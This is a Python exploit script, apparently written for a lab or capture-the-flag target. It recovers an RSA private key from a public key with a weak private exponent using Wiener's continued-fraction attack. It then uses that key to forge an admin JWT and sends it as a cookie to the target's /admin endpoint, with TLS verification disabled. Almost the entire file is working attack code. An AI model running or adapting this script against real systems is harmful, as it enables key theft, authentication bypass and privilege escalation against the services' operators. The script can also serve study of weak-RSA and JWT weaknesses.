#!/usr/bin/env python3
import sys
import time
import math
from Crypto.PublicKey import RSA
import requests
import base64
import json
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

BASE_URL = "http://http_server_c:8000"
HTTP_TIMEOUT = 10

def integer_nth_root(n: int, k: int) -> int:
    if n < 0:
        raise ValueError("n must be non-negative")
    if n == 0:
        return 0
    bits = n.bit_length()
    lo = 1
    hi = 1 << ((bits + k - 1) // k)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        mid_k = mid ** k
        if mid_k <= n:
            lo = mid
        else:
            hi = mid - 1
    return lo

def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode('ascii')

def b64url_decode(s: str) -> bytes:
    rem = len(s) % 4
    if rem:
        s += "=" * (4 - rem)
    return base64.urlsafe_b64decode(s.encode('ascii'))

def continued_fraction(a, b):
    cf = []
    while b:
        q = a // b
        cf.append(q)
        a, b = b, a - q * b
    return cf

def convergents_from_cf(cf):
    p0, q0 = 1, 0
    p1, q1 = cf[0], 1
    yield (p1, q1)
    for a in cf[1:]:
        p2 = a * p1 + p0
        q2 = a * q1 + q0
        yield (p2, q2)
        p0, q0, p1, q1 = p1, q1, p2, q2

def wiener_attack(e: int, n: int, max_candidates=10000):
    cf = continued_fraction(e, n)
    for i, (k, d_candidate) in enumerate(convergents_from_cf(cf)):
        if i > max_candidates:
            break
        if k == 0:
            continue
        if (e * d_candidate - 1) % k != 0:
            continue
        phi_candidate = (e * d_candidate - 1) // k
        s = n - phi_candidate + 1
        discr = s * s - 4 * n
        if discr < 0:
            continue
        r = integer_nth_root(discr, 2)
        if r * r != discr:
            continue
        p = (s + r) // 2
        q = (s - r) // 2
        if p * q == n and p != 1 and q != 1:
            return int(d_candidate), int(k)
    return None, None

def recover_p_q_from_phi(n: int, phi: int):
    s = n - phi + 1
    discr = s * s - 4 * n
    if discr < 0:
        return None, None
    r = integer_nth_root(discr, 2)
    if r * r != discr:
        return None, None
    p = (s + r) // 2
    q = (s - r) // 2
    if p * q == n:
        return int(p), int(q)
    return None, None

def main():
    pub_url = BASE_URL.rstrip("/") + "/public.pem"
    print(f"[*] Fetching public key from: {pub_url}")
    start = time.time()
    try:
        resp = requests.get(pub_url, timeout=HTTP_TIMEOUT, verify=False)
        resp.raise_for_status()
    except Exception as e:
        print(f"[!] Error fetching public key: {e}")
        return

    try:
        rsa_pub = RSA.import_key(resp.content)
    except Exception as e:
        print(f"[!] Failed to parse public key PEM: {e}")
        return

    n, e = rsa_pub.n, rsa_pub.e
    print(f"[*] Parsed public key: n bitlen={n.bit_length()}, e={e}")
    print("[*] Running Wiener's attack ...")
    d_found, k_found = wiener_attack(e, n)
    if d_found is None:
        print("[!] Wiener attack failed.")
        return
    print(f"[+] Wiener success: d={d_found}")

    phi = (e * d_found - 1) // k_found if k_found else None
    p, q = recover_p_q_from_phi(n, phi) if phi else (None, None)
    from Crypto.PublicKey import RSA as RSA_mod
    rsa_priv = RSA_mod.construct((n, e, d_found, p, q)) if p else RSA_mod.construct((n, e, d_found))

    payload = {"sub": "attacker", "role": "admin", "iat": int(time.time()), "exp": int(time.time()) + 3600}
    header = {"alg": "RS256", "typ": "JWT"}
    header_b = json.dumps(header, separators=(',', ':'), sort_keys=True).encode()
    payload_b = json.dumps(payload, separators=(',', ':'), sort_keys=True).encode()
    signing_input = b"%s.%s" % (b64url_encode(header_b).encode(), b64url_encode(payload_b).encode())
    h = SHA256.new(signing_input)
    sig = pkcs1_15.new(rsa_priv).sign(h)
    token = signing_input.decode() + "." + b64url_encode(sig)
    print(f"[+] Forged JWT:\n{token}")

    # verify local
    try:
        h2 = SHA256.new(signing_input)
        pkcs1_15.new(rsa_priv.publickey()).verify(h2, sig)
        print("[+] Verified local signature OK")
    except Exception as e:
        print(f"[!] Local verify failed: {e}")

    # Send token via cookie to /admin
    admin_url = BASE_URL.rstrip("/") + "/admin"
    try:
        print(f"[*] Trying admin endpoint (via cookie): {admin_url}")
        cookies = {"auth_token": token}
        r = requests.get(admin_url, cookies=cookies, timeout=HTTP_TIMEOUT, verify=False)
        try:
            j = r.json()
            print(f"[*] /admin returned HTTP {r.status_code}:")
            print(json.dumps(j, indent=2))
        except Exception:
            print(f"[*] /admin returned HTTP {r.status_code}: {r.text}")
    except Exception as e:
        print(f"[!] Failed to call /admin: {e}")

    total = time.time() - start
    print(f"[*] Complete. Total elapsed: {total:.3f}s")

if __name__ == "__main__":
    main()
